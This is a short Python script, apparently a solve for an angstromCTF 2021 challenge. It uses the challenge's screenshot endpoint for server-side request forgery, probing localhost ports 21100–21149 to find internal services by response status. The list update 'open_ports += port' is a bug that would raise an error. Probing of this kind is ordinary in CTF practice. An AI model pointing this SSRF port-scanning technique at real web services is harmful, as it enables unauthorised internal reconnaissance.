import requests

url = "https://wdwaas.2021.chall.actf.co/screenshot?url=http://127.0.0.1:{}/"
s = requests.Session()
open_ports = []
for port in range(21100,21150):
	r = s.get(url.format(port))
	print(f"Checking Port: {port} Found: {str(open_ports)}")
	if not(r.status_code>=500):
		print(f"Found: {port},Status: {r.status_code}")
		open_ports += port

# r = s.get("https://wdwaas.2021.chall.actf.co/screenshot?url=http://127.0.0.1:21111/")
# print(r.status_code)
# print(r.text)